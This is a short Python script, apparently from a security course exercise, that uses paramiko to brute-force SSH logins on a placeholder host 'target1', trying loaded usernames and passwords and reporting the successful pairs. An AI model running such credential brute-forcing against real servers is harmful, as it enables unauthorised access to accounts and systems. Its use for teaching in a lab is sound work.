from paramiko import AutoAddPolicy, SSHClient
from paramiko.ssh_exception import AuthenticationException
from brute_force import *


def ssh_login(
    ssh_client: SSHClient,
    host: str,
    port: int,
    user: str,
    password: str
) -> bool:
    try:
        ssh_client.connect(host, port, user, password)
    except AuthenticationException:
        succeed = False
    else:
        succeed = True
    finally:
        ssh_client.close()
    return succeed


if __name__ == '__main__':

    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy)

    # Provide valid host and port
    host = 'target1'
    port = 22

    # Task 3. Load usernames and passwords using the functions you implemented.
    users = load_users()
    passwords = load_passwords()

    def login(user, password): return ssh_login(
        ssh_client, host, port, user, password)

    report(brute_force(login, users, passwords), f'ssh at {host}')
